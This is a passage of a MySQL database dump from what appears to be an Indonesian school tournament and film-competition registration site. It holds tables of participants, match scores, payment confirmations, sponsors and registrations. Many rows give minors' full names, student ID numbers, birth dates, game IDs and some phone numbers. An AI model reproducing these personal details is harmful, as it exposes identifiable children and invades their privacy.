(149, 125, '125_1573050420.jpg', '.', '0016059692', 'Angga Budiono', '0', '2001-05-31', NULL, 95747006, 'Dlxz|Feekz', NULL),
(150, 124, '124_1573050831.jpg', '.', '00571979905', 'Raihan Vivardian', '0', '2005-09-25', NULL, 139080750, 'Graysnitch', NULL),
(151, 124, '124_1573050921.jpg', '.', '0045150826', 'Mahmurrudin', '0', '2004-03-29', NULL, 14716888, 'U D I N', NULL),
(152, 124, '124_1573051021.jpg', '.', '0059888823', 'M Rafi Dailami', '0', '2005-03-03', NULL, 204547889, 'Rafi of gaming', NULL),
(153, 124, '124_1573051142.jpg', '.', '0074154509', 'Satrio Dwi Nugroho', '0', '2007-06-02', NULL, 75213914, 'GHOST.RioZzZ\'SFG', NULL),
(154, 124, '124_1573051240.jpg', '.', '0078117670', 'Dwiky Kumara Mahardika', '0', '2007-03-28', NULL, 126948890, 'KIRA|EASY P2', NULL),
(155, 126, '126_1573217609.jpg', '.', '0034672916', 'Deni Rahmawan', '0', '2003-12-16', NULL, 40069926, 'Kouga_omega', NULL),
(156, 126, '126_1573217769.jpg', '.', '0039249021', 'Gilang Bara B', '0', '2003-06-24', NULL, 97554954, '*Sparrow*', NULL),
(157, 126, '126_1573217960.jpg', '.', '0038337915', 'Kemal Afif Firzi', '0', '2003-06-13', NULL, 157815866, 'Arjung Ireng', NULL),
(158, 126, '126_1573218224.jpg', '.', '0034672906', 'Gilang putra', '0', '2003-11-15', NULL, 57425132, 'Semur Jengkol', NULL),
(159, 126, '126_1573218373.jpg', '.', '0033574607', 'Milano Sheva W', '0', '2003-07-07', NULL, 64223547, 'Over°Sentyne', NULL),
(160, 127, '127_1573223451.jpg', '.', '0047602420', 'Jonathan', '0', '2004-04-06', NULL, 174866254, 'JonaaThePublic', NULL),
(161, 127, '127_1573223703.jpg', '.', '0034876387', 'Farhan Muhammad S', '0', '2004-09-14', NULL, 55121205, 'Lyra°barracuda', NULL),
(162, 127, '127_1573223970.jpg', '.', '0041698265', 'Hazim Zhukur M', '0', '2004-03-18', NULL, 25913144, 'Royalehazima', NULL),
(163, 127, '127_1573224085.jpg', '.', '0039279338', 'Muhammad Arief A', '0', '2003-12-27', NULL, 60033532, '•ackerman•', NULL),
(164, 127, '127_1573224179.jpg', '.', '0040719030', 'M Rafif W', '0', '2004-08-30', NULL, 91933904, 'W I B U M A N', NULL),
(165, 128, '128_1573224660.jpg', '.', '0056815800', 'Nahl Untung D', '0', '2003-03-27', NULL, 70939988, 'CrazyNAE', NULL),
(166, 128, '128_1573224773.jpg', '.', '0056760018', 'Joko Surahman', '0', '2003-02-08', NULL, 109344161, 'Jendraljookoss', NULL),
(167, 128, '128_1573224902.jpg', '.', '51186555', 'Alfizhar ikhrom', '0', '2003-01-29', NULL, 435876016, '606060Y', NULL),
(168, 128, '128_1573225023.jpg', '.', '58253616', 'Dinar Herjuna', '0', '2005-04-03', NULL, 107937479, 'Midnightazein', NULL),
(169, 128, '128_1573225147.jpg', '.', '0054908087', 'Wahyu Prasetyanto', '0', '2005-03-20', NULL, 371103439, 'Pethom', NULL),
(170, 129, '129_1573229595.jpg', '.', '0046290350', 'Prasetyo Yusuf E', '0', '2004-10-23', NULL, 135490800, '(K)EFFENDI<>', NULL),
(171, 129, '129_1573229707.jpg', '.', '0046583120', 'Achmad Taji Akbar', '0', '2004-11-21', NULL, 281864440, 'LoremasEr', NULL),
(172, 129, '129_1573229799.jpg', '.', '0051842933', 'Syarief Maulana', '0', '2005-07-23', NULL, 159637805, 'FormulaIclJokeRis', NULL),
(173, 129, '129_1573229888.jpg', '.', '0046553592', 'M Nur Zaqi', '0', '2005-05-15', NULL, 49143840, 'PATRICK*', NULL),
(174, 129, '129_1573229968.jpg', '.', '0065108552', 'M Hadi Hafidhi', '0', '2005-01-23', NULL, 153216229, 'Sorahine606', NULL),
(175, 106, '106_1573566932.jpg', '.', '329927794', 'Hanzel Samuel', '081291331410', '2003-06-01', 'Cameramen', NULL, NULL, NULL),
(176, 106, '106_1573567083.jpg', '.', '0031897474', 'Bunyanuddin', '0895331101803', '2003-01-04', 'Pemain', NULL, NULL, NULL),
(177, 106, '106_1573576500.jpg', '.', '25018494', 'Muhammad Luthfi', '0816814563', '2002-10-28', 'Pemain, Penulis Cerita', NULL, NULL, NULL),
(178, 133, '133_1573708017.jpg', '.', '192010250', 'Amanda Cahya Nabilla', '08', '2004-07-21', 'Pemain', NULL, NULL, NULL);

-- --------------------------------------------------------

--
-- Struktur dari tabel `gallery`
--

CREATE TABLE `gallery` (
  `id_gambar` int(11) NOT NULL,
  `foto` text NOT NULL,
  `caption` text NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

-- --------------------------------------------------------

--
-- Struktur dari tabel `hasil_pertandingan`
--

CREATE TABLE `hasil_pertandingan` (
  `id_hp` int(11) NOT NULL,
  `tanggal` date NOT NULL,
  `kategori` text NOT NULL,
  `tim1` text NOT NULL,
  `score1` text NOT NULL,
  `kk1` text NOT NULL,
  `km1` text NOT NULL,
  `tim2` text NOT NULL,
  `score2` text NOT NULL,
  `kk2` text NOT NULL,
  `km2` text NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

--
-- Dumping data untuk tabel `hasil_pertandingan`
--

INSERT INTO `hasil_pertandingan` (`id_hp`, `tanggal`, `kategori`, `tim1`, `score1`, `kk1`, `km1`, `tim2`, `score2`, `kk2`, `km2`) VALUES
(3, '2019-11-03', 'SMP', 'SMPN 2 TAMBUN SELATAN (A)', '[\"Athallah Syawal P\",\"Zuhair Badruttamam\"]', '[\"Zidan Firliansyah\"]', '[null]', 'SMPN 5 TAMBUN SELATAN (B)', '[null]', '[\"Farrel\"]', '[null]'),
(5, '2019-11-03', 'SMP', 'SMPN 4 CIBITUNG', '[\"Eka Saputra\",\"Syaiful A\", \"PK\"]', '[null]', '[null]', 'SMPN 1 TAMBUN SELATAN (B)', '[\"Dafa\",\"Bagus\"]', '[\"Abiyan\"]', '[null]'),
(6, '2019-11-03', 'SMP', 'SMPN 3 TAMBUN SELATAN (A)', '[\"Satrio Septyantoro\",\"Rizky\"]', '[null]', '[null]', 'SMP ISLAMIYAH', '[\"M Shendy\"]', '[\"Ghifary\"]', '[null]'),
(7, '2019-11-03', 'SMP', 'SMP MUHADJIRIN (B)', '[\"Khairul Anwar\",\"Magrendra\"]', '[null]', '[null]', 'SMPN 8 CIBITUNG', '[\"Nabil\",\"Nabil\",\"Abdurahman\",\"Rifo\"]', '[null]', '[null]'),
(9, '2019-11-03', 'SMP', 'SMPN 11 TAMBUN SELATAN (A)', '[\"M Agus\"]', '[\"Efin\"]', '[null]', 'SMP TAMBUN ISLAMIC SCHOOL', '[null]', '[\"Renaldi\"]', '[null]'),
(8, '2019-11-03', 'SMP', 'SMP MUHADJIRIN (A)	', '[null]', '[null]', '[null]', 'SMPN 1 TAMBUN SELATAN (A)', '[\"Vhiraz Syauqi\",\"Yafizh Ramadhan\",\"Haikal Fallah\",\"W Ahmad\"]', '[\"Rangga Enfin\"]', '[null]'),
(10, '2019-11-03', 'SMP', 'SMPN 2 TAMBUN SELATAN (B)', '[\"Andika P\",\"Andika P\",\"Andika P\",\"Andika P\",\"Yudif Kamal\"]', '[\"Ilham R\",\"Ardi\"]', '[null]', 'SMPN 3 TAMBUN SELATAN (B)', '[\"Raisa F\"]', '[null]', '[null]'),
(11, '2019-11-03', 'SMP', 'SMPN 5 TAMBUN SELATAN (A)', '[\"Lintang Adi\",\"Jordy\"]', '[null]', '[null]', 'SMPN 6 TAMBUN SELATAN', '[\"Primanda\"]', '[null]', '[null]'),
(12, '2019-11-03', 'SMP', 'SMP PERMATA HATI', '[\"Fairus\",\"Fairus\"]', '[null]', '[null]', 'SMP BUDI LUHUR', '[\"Rafa\",\"Romi\",\"Romi\"]', '[null]', '[null]'),
(13, '2019-11-03', 'SMA', 'SMA PUSAKA NUSANTARA', '[\"PK\"]', '[null]', '[null]', 'SMK YATINDO', '[null]', '[null]', '[null]'),
(14, '2019-11-03', 'SMA', 'SMK SEPULUH NOPEMBER (A)', '[\"Juan Darwis\",\"Juan Darwis\",\"Kardika Andra P\",\"Kardika Andra P\",\"Kardika Andra P\",\"Nur Aziz\"]', '[null]', '[null]', 'SMA NURUL FAJRI', '[\"Adlan\",\"OG\"]', '[null]', '[null]'),
(15, '2019-11-03', 'SMA', 'SMK GLOBAL TEKNOLOGI', '[\"Faris\",\"Dzaki\",\"Indra\",\"Oji\"]', '[null]', '[null]', 'SMA MUTIARA HIKMAH', '[\"Amar\",\"Agakhan\"]', '[null]', '[null]'),
(16, '2019-11-03', 'SMA', 'SMK KARYA BANGSA', '[\"Davito\", \"PK\"]', '[\"Sandi\"]', '[null]', 'MA AT TAQWA', '[\"Roga\"]', '[null]', '[null]'),
(17, '2019-11-03', 'SMA', 'SMK YAPIN O2 SETU (A)', '[null]', '[\"Arul\"]', '[null]', 'SMK BUDI PERKASA', '[\"Ariyah\",\"Syarif\",\"Rizky\"]', '[null]', '[null]'),
(19, '2019-11-03', 'SMA', 'SMAN 4 TAMBUN SELATAN (B)', '[\"Rojak\",\"Bari\"]', '[\"Dendi\"]', '[null]', 'SMAN 9 TAMBUN SELATAN', '[\"Viniam\"]', '[null]', '[null]'),
(21, '2019-11-09', 'SMP', 'MTS PINK (B)', '[\"M Ramdhani F\"]', '[\"Abdi Roso Sirait\"]', '[null]', 'SMPN 2 TAMBUN SELATAN (A)', '[\"Zuhar B\",\"PK\"]', '[\"Zuhar B\"]', '[null]'),
(37, '2019-11-10', 'SMP', 'SMPN 2 TAMBUN SELATAN (A)', '[\"Athallah Syawal P\",\"Abdu M\"]', '[null]', '[null]', 'SMPN 4 CIBITUNG', '[\"M Khairul R\"]', '[null]', '[null]'),
(22, '2019-11-09', 'SMP', 'SMPN 11 TAMBUN SELATAN (B)', '[null]', '[\"Bintang\"]', '[null]', 'SMPN 4 CIBITUNG', '[\"Rasya Satria N\",\"OG\",\"OG\"]', '[null]', '[null]'),
(24, '2019-11-09', 'SMP', 'SMPN 12 TAMBUN SELATAN (A)', '[\"Novan\"]', '[null]', '[null]', 'SMPN 3 TAMBUN SELATAN (A)', '[\"Satrio Septyantoro\",\"Satrio Septyantoro\"]', '[\"Dio Rizky Lazuardi\"]', '[null]'),
(25, '2019-11-09', 'SMP', 'SMP AL FIDA', '[\"Feri\",\"Wudi\"]', '[null]', '[null]', 'SMPN 8 CIBITUNG', '[\"Arya\"]', '[null]', '[null]'),
(27, '2019-11-09', 'SMA', 'SMK TELESANDI', '[\"Jauhan\"]', '[\"Rizky Fauzan\"]', '[null]', 'SMA PUSAKA NUSANTARA', '[\"Abyan\",\"PK\"]', '[null]', '[null]'),
(28, '2019-11-09', 'SMA', 'SMK SEPULUH NOPEMBER (A)', '[\"Zulpa Ardian\",\"Nur Aziz\",\"Rifky Januardi\",\"Ari Nurhakim\",\"Kardika Andra P\",\"Kardika Andra P\"]', '[null]', '[null]', 'SMA AL GHAZY', '[\"Saiful\",\"Fikri\"]', '[null]', '[null]'),
(29, '2019-11-09', 'SMA', 'SMK IT AT TAQWA', '[\"Aditya\",\"Dimas\",\"Dimas\"]', '[null]', '[null]', 'SMK GLOBAL TEKNOLOGI', '[\"Ahmad Dzila\",\"Fakhrurozi\"]', '[\"M Nasawi\",\"Rahmat\"]', '[null]'),
(30, '2019-11-09', 'SMP', 'SMPN 1 TAMBUN SELATAN (A)', '[\"Yafizh Ramadhan\",\"Naya Buzjari\",\"Haikal Fallah\"]', '[null]', '[null]', 'SMPN 12 TAMBUN SELATAN (B)', '[\"Rangga\"]', '[null]', '[null]'),
(31, '2019-11-09', 'SMP', 'SMPN 11 TAMBUN SELATAN (A)', '[\"M Agus\",\"M Agus\",\"Ucok\",\"Ucok\"]', '[\"Ucok\"]', '[null]', 'MTS PINK (A)', '[\"Ahmad Syaiful\",\"Ahmad Syaiful\"]', '[null]', '[null]'),
(32, '2019-11-09', 'SMP', 'SMPN 2 TAMBUN SELATAN (B)', '[\"Andika P\",\"PK\"]', '[null]', '[null]', 'SMP DEWAN DAKWAH', '[\"Nafu Nafis\"]', '[\"Abdillah\"]', '[null]'),
(33, '2019-11-09', 'SMP', 'SMPN 5 TAMBUN SELATAN (A)', '[\"Lintang Adi\",\"Jordi A\"]', '[null]', '[null]', 'SMP BUDI LUHUR', '[\"Januard\"]', '[null]', '[null]'),
(34, '2019-11-09', 'SMA', 'SMK SEPULUH NOPEMBER (B)', '[\"Erdi\"]', '[null]', '[null]', 'SMA 4 TAMBUN SELATAN (A)', '[null]', '[\"Maimun\"]', '[null]'),
(35, '2019-11-09', 'SMA', 'SMAN 5 TAMBUN SELATAN', '[\"Fauzan H\",\"Nanang W A\",\"Faalih Pandu\",\"Udztawa K\",\"Udztawa K\"]', '[null]', '[null]', 'SMK YAPIN 02 SETU (B)', '[\"Irgi Maulana\"]', '[null]', '[null]'),
(36, '2019-11-09', 'SMA', 'SMK KARYA BANGSA', '[\"M Rere\"]', '[null]', '[null]', 'SMA 7 TAMBUN SELATAN', '[\"Rahul\",\"PK\"]', '[\"Mahendra\"]', '[null]'),
(38, '2019-11-10', 'SMP', 'SMPN 3 TAMBUN SELATAN (A)', '[\"M Rizky Jamaludin\",\"M Rizky Jamaludin\",\"M Rizky Jamaludin\",\"M Rizky Jamaludin\",\"Marcus ST Gultom\"]', '[null]', '[null]', 'SMP AL FIDA', '[\"Feri\",\"Irsyad\"]', '[null]', '[null]'),
(39, '2019-11-10', 'SMP', 'SMPN 1 TAMBUN SELATAN (A)', '[\"Yafizh Ramadhan\"]', '[null]', '[null]', 'SMPN 11 TAMBUN SELATAN (A)', '[null]', '[null]', '[null]'),
(40, '2019-11-10', 'SMP', 'SMPN 2 TAMBUN SELATAN (B)', '[\"Sendy\",\"Sendy\",\"Sendy\",\"OG\"]', '[null]', '[null]', 'SMPN 5 TAMBUN SELATAN (A)', '[null]', '[null]', '[null]'),
(41, '2019-11-10', 'SMA', 'SMA PUSAKA NUSANTARA', '[\"Adit\",\"Repan\",\"Repan\"]', '[null]', '[null]', 'SMK BUDI PERKASA', '[\"Rizki Dwi\"]', '[\"M Rizki\"]', '[null]'),
(42, '2019-11-10', 'SMA', 'SMAN 4 TAMBUN SELATAN (B)', '[null]', '[\"Bari\"]', '[null]', 'SMK SEPULUH NOPEMBER (A)', '[\"Nur Aziz\",\"Julpa\",\"Rozak\"]', '[null]', '[null]'),
(43, '2019-11-10', 'SMA', 'SMK IT AT TAQWA', '[\"Adit\"]', '[null]', '[null]', 'SMK SEPULUH NOPEMBER (B)', '[\"Diki\",\"Erdi\",\"Erdi\",\"Eki\"]', '[null]', '[null]'),
(44, '2019-11-10', 'SMA', 'SMAN 5 TAMBUN SELATAN', '[\"Pandu\",\"Thifal\",\"Udztama\"]', '[\"Fauzan\"]', '[null]', 'SMAN 7 TAMBUN SELATAN', '[null]', '[\"Jagad\"]', '[null]'),
(45, '2019-11-17', 'SMP', 'SMPN 2 TAMBUN SELATAN (A)', '[null]', '[null]', '[null]', 'SMPN 3 TAMBUN SELATAN (A)', '[\"Andre Firdaus\",\"Andre Firdaus\"]', '[\"Dio Rizky Lazuardi\",\"Kornelius Satrio S\"]', '[null]'),
(46, '2019-11-17', 'SMP', 'SMPN 1 TAMBUN SELATAN (A)', '[\"Naoya\"]', '[null]', '[null]', 'SMPN 2 TAMBUN SELATAN (B)', '[\"Andika P\",\"PK\"]', '[null]', '[null]'),
(47, '2019-11-17', 'SMA', 'SMA PUSAKA NUSANTARA', '[\"Abyan\",\"Bahtiar\",\"Daniel\",\"Rizky\",\"Rizky\",\"Anggit\"]', '[null]', '[null]', 'SMK SEPULUH NOPEMBER (A)', '[\"Ari Nurhakim\"]', '[null]', '[null]'),
(48, '2019-11-17', 'SMP', 'SMPN 1 TAMBUN SELATAN (A)', '[null]', '[null]', '[null]', 'SMPN 2 TAMBUN SELATAN (B)', '[\"Haikal Fallah\"]', '[null]', '[null]'),
(49, '2019-11-17', 'SMA', 'SMK SEPULUH NOPEMBER (B)', '[\"Erdi\",\"Reja\",\"Ekky\"]', '[\"Erdi\",\"Reja\"]', '[null]', 'SMAN 5 TAMBUN SELATAN', '[\"Nanang W A\",\"Faalih Pandu\"]', '[null]', '[null]'),
(50, '2019-11-17', 'SMA', 'SMAN 5 TAMBUN SELATAN', '[\"Reza\",\"Reza\"]', '[null]', '[null]', 'SMK SEPULUH NOPEMBER (A)', '[\"Nur Aziz\",\"Nur Aziz\",\"Nur Aziz\",\"Rojah\",\"Rojah\"]', '[null]', '[null]'),
(51, '2019-11-17', 'SMP', 'SMPN 2 TAMBUN SELATAN (B)', '[\"Andika P\",\"Andika P\",\"Andika P\"]', '[null]', '[null]', 'SMPN 3 TAMBUN SELATAN (A)', '[\"Kornelius\"]', '[\"Galang\"]', '[null]'),
(52, '2019-11-17', 'SMA', 'SMA PUSAKA NUSANTARA', '[\"Bahtiar\"]', '[null]', '[null]', 'SMA SEPULUH NOPEMBER (B)', '[null]', '[null]', '[null]');

-- --------------------------------------------------------

--
-- Struktur dari tabel `konfirmasi_payment`
--

CREATE TABLE `konfirmasi_payment` (
  `id_payment` int(11) NOT NULL,
  `id_daftar` int(11) NOT NULL,
  `pengirim` text NOT NULL,
  `bukti` text NOT NULL,
  `status` enum('valid','invalid','uncheck','') NOT NULL DEFAULT 'uncheck',
  `created_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  `updated_at` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00'
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data untuk tabel `konfirmasi_payment`
--

INSERT INTO `konfirmasi_payment` (`id_payment`, `id_daftar`, `pengirim`, `bukti`, `status`, `created_at`, `updated_at`) VALUES
(1, 4, 'zxc', '4.jpg', 'valid', '2019-09-18 13:06:02', '2019-09-18 14:06:02'),
(2, 15, 'Ioio', '15.jpg', 'valid', '2019-09-19 15:19:23', '2019-09-19 16:19:23'),
(3, 18, 'Bukti Pembayaran', '18.jpg', 'valid', '2019-09-20 12:54:27', '2019-09-20 13:54:27'),
(4, 16, 'LENNY MELINA SITOHAN', '16.jpeg', 'valid', '2019-09-22 08:47:45', '2019-09-22 09:47:45'),
(5, 30, 'INVFEST', '30.jpg', 'uncheck', '2019-09-23 07:42:19', '2019-09-23 07:42:19'),
(6, 29, 'ENTOL', '29.png', 'valid', '2019-09-23 10:09:34', '2019-09-23 11:09:34'),
(7, 10, 'muhammad ihsan rabbani', '10.jpeg', 'valid', '2019-09-24 05:34:39', '2019-09-24 06:34:39'),
(8, 34, 'Felia ananta', '34.png', 'valid', '2019-10-02 05:57:57', '2019-10-02 06:57:57'),
(9, 45, 'Dodi sudiana', '45.jpg', 'valid', '2019-10-16 11:37:29', '2019-10-16 12:37:29'),
(10, 14, 'Jody setiawan', '14.jpeg', 'valid', '2019-10-16 11:38:52', '2019-10-16 12:38:52'),
(14, 56, 'DIMAS', '56.jpg', 'valid', '2019-10-22 10:17:56', '2019-10-22 11:17:56'),
(15, 57, 'fahmi dong', '57.jpg', 'valid', '2019-10-23 02:40:54', '2019-10-23 03:40:54'),
(16, 58, 'fahmipra', '58.png', 'valid', '2019-10-23 02:49:13', '2019-10-23 03:49:13'),
(17, 62, 'Rambu', '62.jpg', 'valid', '2019-10-28 09:03:19', '2019-10-28 10:03:19'),
(18, 61, 'Gilang Ardiansyah', '61.jpg', 'valid', '2019-10-28 09:01:48', '2019-10-28 10:01:48'),
(19, 64, 'abdul', '64.jpg', 'valid', '2019-10-27 00:14:18', '2019-10-27 01:14:18'),
(20, 67, 'mardi', '67.jpg', 'valid', '2019-10-27 00:14:05', '2019-10-27 01:14:05'),
(21, 68, 'fahmipra', '68.jpg', 'valid', '2019-10-27 00:14:01', '2019-10-27 01:14:01'),
(22, 69, 'fahmipra', '69.jpg', 'valid', '2019-10-27 00:14:12', '2019-10-27 01:14:12'),
(23, 70, 'fahmipra', '70.jpg', 'valid', '2019-10-27 00:14:08', '2019-10-27 01:14:08'),
(24, 106, 'Nia Damayanti', '106.jpg', 'valid', '2019-11-01 00:19:28', '2019-11-01 01:19:28'),
(25, 113, 'DODI SUDIANA', '113.jpg', 'valid', '2019-11-02 15:11:47', '2019-11-02 16:11:47');

-- --------------------------------------------------------

--
-- Struktur dari tabel `live`
--

CREATE TABLE `live` (
  `id_live` int(11) NOT NULL,
  `nama` varchar(255) NOT NULL,
  `url` varchar(255) NOT NULL,
  `status` varchar(2) NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

--
-- Dumping data untuk tabel `live`
--

INSERT INTO `live` (`id_live`, `nama`, `url`, `status`) VALUES
(1, 'Free Fire', 'https://youtube.comssss', '1'),
(2, 'Mobile Legend', 'https://www.youtube.com/embed/_DVDdak0Pgk', '1');

-- --------------------------------------------------------

--
-- Struktur dari tabel `migrations`
--

CREATE TABLE `migrations` (
  `id` int(10) UNSIGNED NOT NULL,
  `migration` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `batch` int(11) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data untuk tabel `migrations`
--

INSERT INTO `migrations` (`id`, `migration`, `batch`) VALUES
(1, '2014_10_12_000000_create_users_table', 1),
(2, '2014_10_12_100000_create_password_resets_table', 1);

-- --------------------------------------------------------

--
-- Struktur dari tabel `partner`
--

CREATE TABLE `partner` (
  `id_partner` int(11) NOT NULL,
  `tipe` enum('media','sponsor','','') NOT NULL,
  `logo` text NOT NULL,
  `nama_partner` text NOT NULL,
  `width` int(10) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data untuk tabel `partner`
--

INSERT INTO `partner` (`id_partner`, `tipe`, `logo`, `nama_partner`, `width`) VALUES
(4, 'media', '1567410142.jpg', 'Info.Tambun', 30),
(7, 'media', '1567876914.jpeg', 'Pray Event', 30),
(8, 'sponsor', '1568280116.png', 'Telkomsel', 70),
(9, 'media', '1568806884.jpg', 'Concertify', 60),
(10, 'sponsor', '1570445852.jpg', 'ITT PURWOKERTO', 100),
(11, 'sponsor', '1570446030.png', 'SINDE', 50),
(12, 'sponsor', '1570669865.png', 'Toyota', 100),
(13, 'media', '1571217692.png', 'Seni Media', 30);

-- --------------------------------------------------------

--
-- Struktur dari tabel `password_resets`
--

CREATE TABLE `password_resets` (
  `email` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `token` varchar(191) COLLATE utf8mb4_unicode_ci NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- --------------------------------------------------------

--
-- Struktur dari tabel `pendaftaran`
--

CREATE TABLE `pendaftaran` (
  `id_daftar` int(11) NOT NULL,
  `id_user` int(11) NOT NULL,
  `id_bidang_lomba` int(11) NOT NULL,
  `kode_unik` int(3) NOT NULL,
  `kode_daftarulang` text NOT NULL,
  `sinobsis` text,
  `nama_team` varchar(255) DEFAULT NULL,
  `nama_pelatih` text,
  `no_pelatih` text,
  `created_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  `tgl_kadaluarsa` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00',
  `kadaluarsa` tinyint(1) NOT NULL DEFAULT '0',
  `pembayaran` tinyint(1) DEFAULT '0',
  `valid_player` tinyint(1) NOT NULL DEFAULT '0',
  `daftar_ulang` tinyint(1) NOT NULL DEFAULT '0',
  `updated_at` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00'
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

--
-- Dumping data untuk tabel `pendaftaran`
--

INSERT INTO `pendaftaran` (`id_daftar`, `id_user`, `id_bidang_lomba`, `kode_unik`, `kode_daftarulang`, `sinobsis`, `nama_team`, `nama_pelatih`, `no_pelatih`, `created_at`, `tgl_kadaluarsa`, `kadaluarsa`, `pembayaran`, `valid_player`, `daftar_ulang`, `updated_at`) VALUES
(4, 7, 10, 351, 'K4I5DKVLSI', NULL, 'Si Jago Merah', 'Saya Sendiri', '081324974', '2019-09-18 13:11:47', '2019-09-21 02:09:50', 0, 1, 0, 0, '2019-09-18 14:11:47'),
(6, 7, 1, 814, 'T2E4QNT3EH', NULL, NULL, NULL, NULL, '2019-09-18 13:24:54', '2019-09-21 02:09:39', 0, 1, 1, 0, '2019-09-18 14:24:54'),
(10, 42, 5, 883, 'E52GYMVKYD', NULL, NULL, NULL, NULL, '2019-10-03 01:04:45', '2019-09-21 21:09:24', 0, 1, 1, 0, '2019-10-03 02:04:45'),
(14, 46, 5, 673, '9SAG6NQLGN', NULL, NULL, NULL, NULL, '2019-10-16 11:38:52', '2019-09-22 03:09:07', 0, 1, 0, 0, '2019-10-16 12:38:52'),
(16, 47, 3, 231, 'QNRECAKX9V', NULL, NULL, NULL, NULL, '2019-10-13 13:35:11', '2019-09-22 05:09:15', 0, 1, 1, 0, '2019-10-13 14:35:11'),
(34, 76, 7, 497, 'W0OPT2XWQW', 'Tentang perjuangan seorang kaka untuk sang adik. Hidup sebatang kara, Banting tulang mencari sepeser rupiah untuk memenuhi kehidupan,tak peduli jika raga nya lelah bahkan harus putus sekolah. Tak apa,demi sang adik tercinta', NULL, NULL, NULL, '2019-10-14 12:43:49', '2019-09-29 02:09:41', 0, 1, 0, 0, '2019-10-14 13:43:49'),
(45, 87, 6, 269, 'WCT2W33NMU', NULL, NULL, NULL, NULL, '2019-10-16 11:37:29', '2019-10-09 03:10:40', 0, 1, 0, 0, '2019-10-16 12:37:29'),
(49, 92, 5, 432, 'M60NSRN8DK', NULL, NULL, NULL, NULL, '2019-10-12 16:26:31', '2019-10-15 04:10:31', 0, 0, 0, 0, '2019-10-12 16:26:31'),
(50, 93, 5, 371, 'O6NT03CMEJ', NULL, NULL, NULL, NULL, '2019-10-14 15:50:56', '2019-10-17 03:10:56', 0, 0, 0, 0, '2019-10-14 15:50:56'),
(51, 95, 5, 14, 'IMIB53I0L4', NULL, NULL, NULL, NULL, '2019-10-19 02:45:52', '2019-10-22 02:10:52', 0, 0, 0, 0, '2019-10-19 02:45:52'),
(54, 99, 10, 96, '1OFO4AA327', NULL, NULL, NULL, NULL, '2019-10-21 09:02:20', '2019-10-23 21:10:20', 0, 0, 0, 0, '2019-10-21 09:02:20'),
(55, 99, 10, 214, '1214KZP49W', NULL, NULL, NULL, NULL, '2019-10-21 09:02:21', '2019-10-23 21:10:21', 0, 0, 0, 0, '2019-10-21 09:02:21'),
(56, 54, 4, 894, 'GQ2EJ7YOYK', NULL, NULL, NULL, NULL, '2019-10-22 10:17:56', '2019-10-24 23:10:25', 0, 1, 0, 0, '2019-10-22 11:17:56'),
(57, 102, 10, 638, 'QV5EZI176W', NULL, 'klklpoi', '-', '98765434234558', '2019-10-23 02:42:28', '2019-10-26 03:10:08', 0, 1, 0, 0, '2019-10-23 03:42:28'),
(58, 103, 10, 158, '85KLL1UXVE', NULL, 'SMPN 4 CIBITUNG', '-', '0', '2019-10-23 02:49:55', '2019-10-26 03:10:14', 0, 1, 0, 0, '2019-10-23 03:49:55'),
(59, 104, 5, 296, 'VBHST8OEB9', NULL, NULL, NULL, NULL, '2019-10-23 11:24:55', '2019-10-25 23:10:55', 0, 0, 0, 0, '2019-10-23 11:24:55'),
(60, 105, 4, 420, '8ZLSYPGE20', NULL, NULL, NULL, NULL, '2019-10-23 13:53:57', '2019-10-26 01:10:57', 0, 0, 0, 0, '2019-10-23 13:53:57'),
(61, 106, 5, 91, 'QO4NIE3EVH', NULL, NULL, NULL, NULL, '2019-10-28 09:01:48', '2019-10-26 23:10:59', 0, 1, 0, 0, '2019-10-28 10:01:48'),
(62, 107, 4, 225, 'CLE3M3U9AZ', NULL, NULL, NULL, NULL, '2019-10-28 09:03:19', '2019-10-28 04:10:12', 0, 1, 0, 0, '2019-10-28 10:03:19'),
(63, 82, 10, 165, 'OKYXOBJKD8', NULL, NULL, NULL, NULL, '2019-10-26 15:55:16', '2019-10-29 03:10:16', 0, 0, 0, 0, '2019-10-26 15:55:16'),
(64, 109, 10, 353, 'QBHY1TDR72', NULL, NULL, NULL, NULL, '2019-10-27 00:14:18', '2019-10-30 00:10:56', 0, 1, 0, 0, '2019-10-27 01:14:18'),
(65, 110, 10, 755, 'DQVI81YINV', NULL, NULL, NULL, NULL, '2019-10-27 00:45:31', '2019-10-30 00:10:31', 0, 0, 0, 0, '2019-10-27 00:45:31'),
(66, 110, 10, 168, 'KU3RLL7JY6', NULL, NULL, NULL, NULL, '2019-10-27 00:45:31', '2019-10-30 00:10:31', 0, 0, 0, 0, '2019-10-27 00:45:31'),
(67, 111, 10, 733, 'FET6V1ZLWL', NULL, NULL, NULL, NULL, '2019-10-27 00:14:05', '2019-10-30 00:10:09', 0, 1, 0, 0, '2019-10-27 01:14:05'),
(68, 113, 11, 999, 'W8AHVA8SF7', NULL, NULL, NULL, NULL, '2019-10-27 00:14:01', '2019-10-30 00:10:38', 0, 1, 0, 0, '2019-10-27 01:14:01'),
(69, 112, 11, 827, 'V0TTK3MGXS', NULL, NULL, NULL, NULL, '2019-10-27 00:14:12', '2019-10-30 00:10:04', 0, 1, 0, 0, '2019-10-27 01:14:12'),
(70, 111, 10, 879, '793ZNBCACV', NULL, NULL, NULL, NULL, '2019-10-27 00:14:08', '2019-10-30 00:10:13', 0, 1, 0, 0, '2019-10-27 01:14:08'),
